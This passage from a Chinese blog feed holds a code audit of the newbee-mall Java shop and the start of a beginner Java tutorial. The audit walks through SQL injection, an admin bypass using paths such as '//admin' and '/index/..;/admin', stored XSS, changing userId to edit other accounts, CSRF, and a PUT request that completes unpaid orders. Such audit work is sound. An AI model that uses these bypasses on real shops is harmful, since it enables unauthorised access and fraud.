style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>查看谁调用了getNewBeeMallGoodsPage 方法</p></li><li><p>跟进到NewBeeMallGoodsController</p><p>C:\Users\95227\Desktop\newbee-mall-master\src\main\java\ltd\newbee\mall\controller\admin\NewBeeMallGoodsController.java</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestMapping</span><span style="color: #E06C75">(</span><span style="color: #D19A66">value</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;/goods/list&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #D19A66">method</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">RequestMethod</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">GET</span><span style="color: #E06C75">)</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">ResponseBody</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Result</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">list</span><span style="color: #E06C75">(</span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">RequestParam</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Map</span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">String</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> Object</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> params) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">ObjectUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isEmpty</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">params</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;page&quot;</span><span style="color: #ABB2BF">))</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">||</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ObjectUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isEmpty</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">params</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;limit&quot;</span><span style="color: #ABB2BF">))</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ResultGenerator</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">genFailResult</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;参数异常！&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">PageQueryUtil</span><span style="color: #E06C75"> pageUtil </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">PageQueryUtil</span><span style="color: #E06C75">(params)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ResultGenerator</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">genSuccessResult</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">newBeeMallGoodsService</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getNewBeeMallGoodsPage</span><span style="color: #ABB2BF">(pageUtil));</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure><p>传入了 pageUtil 参数，而该参数同样通过 PageQueryUtil 类创建一个 pageUtil 对象，传入 params 作为参数，以及 params 同样是个 Map 对象。未对其进行过滤处理</p></li><li><p>针对版本低的源码（未修复的）</p><p>直接抓包，报错注入，sqlmap跑就行了（我的漏洞已经“预编译”修复，所以我就不演示了哈）</p></li></ol><h2 id="后台权限绕过"><a href="#后台权限绕过" class="headerlink" title="后台权限绕过"></a>后台权限绕过</h2><p>说到后台，肯定先看admin相关文件啊，所以可以找找登录后台的文件（AdminLogin）</p><ol><li><p>进入src&#x2F;main&#x2F;java&#x2F;ltd&#x2F;newbee&#x2F;mall&#x2F;interceptor&#x2F;AdminLoginInterceptor.java</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163002814.png" alt="image-20251014191955489"></p><p>第一步：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">String</span><span style="color: #E06C75"> requestServletPath </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getServletPath</span><span style="color: #ABB2BF">();</span></span></code></pre></div></div></figure><p>使用getServletPath传入url： getRequestURI 方法返回的路径是未经过服务器端处理的原始路径，可能包含特殊字符或路径跳转，从而绕过服务器端的安全控制</p><p>第二步：</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">requestServletPath</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">startsWith</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;/admin&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">request</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getSession</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getAttribute</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;loginUser&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">) {</span></span></code></pre></div></div></figure><p>先判断 Uri 路径中是否以 &#x2F;admin 开头，然后以及获取并判断Session 中的 loginUser 属性是否为 null</p><p>两个条件 &amp;&amp; 在一起结果为 True 的话进入条件代码</p></li><li><p>payload：</p><ul><li><p>登陆后台寻找一个后台接口（账号密码是弱密码，考考大家吧🤭）<br><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163004797.png" alt="image-20251014193025547"></p></li><li><p>删除cookic之后，查看回显</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163006124.png" alt="image-20251014193040005"></p><p>明显报错了</p></li><li><p>绕过</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163008180.png" alt="image-20251014193103330"></p></li></ul></li></ol><h2 id="XSS漏洞（1，2）"><a href="#XSS漏洞（1，2）" class="headerlink" title="XSS漏洞（1，2）"></a>XSS漏洞（1，2）</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol><li><p>啥也不知道，先在前端进行测试（找那种可以保留的对话框，类似于评论&#x2F;弹幕的那种）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163010034.png" alt="image-20251014193404446"></p><p>搜索xss的代码<strong>没有弹窗</strong>（我觉得应该是因为存在双引号，将代码包起来了）</p></li><li><p>去源码中找找原因（源代码好找，看现在的url，在源代码文件夹寻找相关的代码就行）</p><p>（不明确的话，存在keyword传参，所以直接在项目文件里面搜索keyword即可）</p><p><strong>存在转义</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163014918.png" alt="image-20251014194012915"></p></li><li><p><strong>thymeleaf模版</strong>在对th:text标签进行渲染的时候，默认对特殊字符进行了转义</p><p>接着进入search.html<br>src\main\resources\templates\mall\search.html</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163016401.png" alt="image-20251014201622548"></p><p>找thymeleaf未作转义的输出，th:utext不会将字符转义</p><ul><li><p>第一个，存在th:utext，所以这两个功能点存在XSS。</p></li><li><p>第二个，detail.html因为显示的是商品信息，商品信息使用富文本编辑器，不能简单的转义处理，需要考虑正常的html标签传输，所以作者在这里使用th:utext来显示商品详细。</p></li></ul></li></ol><h3 id="xss（1）："><a href="#xss（1）：" class="headerlink" title="xss（1）："></a>xss（1）：</h3><p>进入商品信息，添加xss的payload</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163018219.png" alt="image-20251014204318619"><br>然后（提交即可弹窗）<br><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163019713.png" alt="image-20251014204241804"></p><h3 id="xss（2）："><a href="#xss（2）：" class="headerlink" title="xss（2）："></a>xss（2）：</h3><ol><li><p>进入订单管理，然后添加payload</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163021921.png" alt="image-20251014204504188"></p></li><li><p>提交即可弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163024553.png" alt="image-20251014204615252"></p></li></ol><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><ol><li><p>上面提到过，存在interceptor拦截器（可以寻找相关函数）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163026770.png" alt="image-20251015154849036"></p></li><li><p>步入看一下</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163028092.png" alt="image-20251015155304419"></p><p>对url路径设置了不同的interceptor</p><p>addPathPatterns表示其中的路径会经过设置的拦截器，excludePathPatterns不过该拦截器</p><p><code>其中两个星**表示匹配任意字符。如果出现一个星*则表示匹配单个路径</code></p></li><li><p>找到拦截器，下面就要看登录页面，所以可以跟进一下NewBeeMallLoginInterceptor</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163029780.png" alt="image-20251015210304376"></p><p>用 getServletPath() 来获取最后真正分发到路由地方的 path，getRequestURI() 只是获取了请求的 URl</p><p>这个意义不大</p><p>所以找一下下一个类AdminLoginInterceptor</p></li><li><p>AdminLoginInterceptor，就是第二步骤里面的类名</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163031202.png" alt="image-20251015210714466"></p><p>使用了 getRequestURI() 来获取URI来判断URI是否以 &#x2F;admin 开头，如果是 &#x2F;admin 开头则校验 session，不是则不用校验（其实这个和上面那个后台权限绕过的类似，都定位到这里了）</p></li><li><p>payload</p><ul><li><p>进入dashboard模块</p><p>输入&#x2F;&#x2F;admin 或 &#x2F;index&#x2F;..;&#x2F;admin也可以成功访问到页面</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163033016.png" alt="image-20251015211040611"></p><p>成功绕过了目录访问字符限制</p></li></ul></li></ol><h2 id="水平越权漏洞（1，2）"><a href="#水平越权漏洞（1，2）" class="headerlink" title="水平越权漏洞（1，2）"></a>水平越权漏洞（1，2）</h2><p>上面的分析已经提前说过了</p><p>可以看一下Controller的<strong>相关文件</strong>，直接看controller<strong>目录</strong>也行，可能存在<strong>水平越权漏洞</strong></p><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><ol><li><p>在文件里面全局搜索<strong>Controller</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163034498.png" alt="image-20251015211548470"></p></li><li><p>寻找到目标文件（初审里面总结一小部分注入点）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163036179.png" alt="image-20251015212148806"></p></li><li><p>接着看 updateUserInfo() 的<strong>实现</strong><br>src\main\java\ltd\newbee\mall\service\impl\NewBeeMallUserServiceImpl.java</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163037476.png" alt="image-20251015213516667"></p><p>发现这里从数据库查找用户并未用到 session ，而是直接以传递过来的 userId 为参数来查找并修改数据的，所以这里存在水平越权漏洞，修改 userId 便可修改其他用户的信息。</p></li><li><p>payload</p><ul><li><p>注册一个用户，然后查看个人信息</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163038729.png" alt="image-20251015213807750"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163215149.png" alt="image-20251015213844712"></p></li><li><p>使用burp抓包，修改用户 userId <img src="C:\Users\95227\AppData\Roaming\Typora\typora-user-images\image-20251015214259650.png" alt="image-20251015214259650" style="zoom:33%;" /></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163044634.png" alt="image-20251015214436198"></p><p>ok，回显成功</p></li></ul></li></ol><h3 id="2"><a href="#2" class="headerlink" title="2"></a>2</h3><ol><li><p>还是根据上面的流程进入OrderController（查询订单）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163046794.png" alt="image-20251015215316713"></p></li><li><p>跟进getOrderDetailByOrderNo() 函数<br>src\main\java\ltd\newbee\mall\service\impl\NewBeeMallOrderServiceImpl.java</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163048125.png" alt="image-20251015215401216"></p><p>还是id问题，输入其他id，可以查看其他人的cookic，没有绕过限制</p></li><li><p>payload</p><p>跟上面一样抓包+改数据即可</p><p>我就不演示了🤭，我相信各位大佬可以</p></li></ol><h2 id="Csrf漏洞"><a href="#Csrf漏洞" class="headerlink" title="Csrf漏洞"></a>Csrf漏洞</h2><ol><li><p>添加购物车功能，抓包，查看请求内容，没有任何token值来进行校验</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163053058.png" alt="image-20251015215926101"></p></li><li><p>由于是json格式的请求，不能直接使用burp Generate CSRF PoC，因为burp生成的PoC无法伪造Content-Type。burp生成的CSRF PoC请求内容如下，可以看到Content-Type: text&#x2F;plain，并且post数据多出一个等号</p><p>直接在bp的插件里面生成csrf的代码就行</p><p>是一个html</p></li><li><p>payload</p><ul><li><p>对上面生成csrf的poc进行抓包</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163055483.png" alt="image-20251015220131216"></p></li><li><p>然后成功写入xss的payload</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163105549.png" alt="image-20251015220157720"></p></li><li><p>查看页面，成功添加</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163106531.png" alt="image-20251015220232223"></p></li></ul></li></ol><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><ol><li><p>下订单但未支付时，访问&#x2F;orders&#x2F;{orderNo}&#x2F;finish可直接完成交易</p><p>直接看代码</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163113629.png" alt="image-20251015220420234"></p><p>从代码中发现直接调用newBeeMallOrderService.finishOrder(orderNo, user.getUserId())，对于该订单是否支付，是否出库等过程都<strong>没有校验</strong></p></li><li><p>put方式去请求即可（左边标黄的就是  <strong>putmapping</strong>）<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163114921.png" alt="image-20251015220657894"></p></li><li><p>payload</p><ul><li><p>添加一件物品到购物车，然后提交订单</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163116396.png" alt="image-20251015220904271"></p></li><li><p>点击去支付，一系列流程下来可以购买商品</p><p>管理员查看显示  待支付</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163118857.png" alt="image-20251015221005435"></p></li><li><p>我们使用put方式去请求</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163121952.png" alt="image-20251015221101972"></p></li><li><p>查看回显成功支付商品</p></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java入门</title>
    <link href="/2025/10/27/java%E5%85%A5%E9%97%A8/"/>
    <url>/2025/10/27/java%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><h2 id="用户交互Scanner"><a href="#用户交互Scanner" class="headerlink" title="用户交互Scanner"></a>用户交互Scanner</h2><ol><li><p>输入&amp;输入方法（比如是输入hello  world）</p><ul><li><p>next（）输入字符串不能存在空格      （输出hello）</p></li><li><p>nextLine（），回车前的所有字符，可以获取到空格     （输出hello  world）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">xxxxx.xxx.xxx</span></span><span class="line"><span style="color: #FFFFFF">import</span><span style="color: #C678DD"> java.util.</span><span style="color: #FFFFFF">S</span><span style="color: #C678DD">canner</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Demo03</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #7F848E; font-style: italic">// 从键盘接收数据</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Scanner</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">scanner</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Scanner</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">in</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;请输入数据：&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">str</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">scanner</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">nextLine</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;输出的内容为：&quot;</span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF">str);</span></span><span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">scanner</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">close</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li></ul></li><li><p>判断</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">scanner</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">hasNextInt</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75">) {    </span><span style="color: #7F848E; font-style: italic">//这个条件是判断 输入是不是整数的</span></span><span class="line"><span style="color: #E06C75">    i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">scanner</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">nextInt</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;整数数据：&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> i);</span></span><span class="line"><span style="color: #E06C75">} </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;输入的不是整数数据：&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> i);</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>判断字符串有函数：<br>x.equal（“xcsccsc”）     判断x输入字符串和xcsccsc字符串是否相等</p></li></ol><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><ol><li><p>if</p><ul><li><p>单层–if</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">if</span><span style="color: #E06C75">(){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;*****&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>两层–if    else</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">if</span><span style="color: #E06C75">(){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;*****&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #E06C75">}</span><span style="color: #C678DD">else</span><span style="color: #E06C75">(){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;*****&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li><li><p>多层–if   else if   else</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">if</span><span style="color: #E06C75">(){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;*****&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #E06C75">}</span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75">(){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;*****&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #E06C75">}</span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75">(){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;*****&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #E06C75">}</span><span style="color: #C678DD">else</span><span style="color: #E06C75">(){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;*****&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li></ul></li><li><p>switch case</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">switch</span><span style="color: #E06C75">(expression){</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">case</span><span style="color: #E06C75"> value </span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">//语句</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">break</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//可选</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">case</span><span style="color: #E06C75"> value </span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">//语句</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">break</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//可选</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//你可以有任意数量的case语句</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">default</span><span style="color: #E06C75"> </span><span style="color: #C678DD">:</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//可选</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #7F848E; font-style: italic">//语句</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p><strong>注意：</strong></p><ul><li>switch变量类型：byte   short   int   char   <strong>string</strong>（java7以后）</li><li>case变量类型：字符串常量  自变量</li><li>case穿透：不写break就在条件后<strong>全执行</strong></li></ul></li></ol><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><ol><li><p>while</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">while</span><span style="color: #E06C75">(布尔值){</span></span><span class="line"><span style="color: #E06C75">    </span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure><p>注意要写退出循环的限制条件，不然会变成死循环</p><p>eg：i++；</p></li><li><p>do  while</p><figure class="shiki jaVA"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span 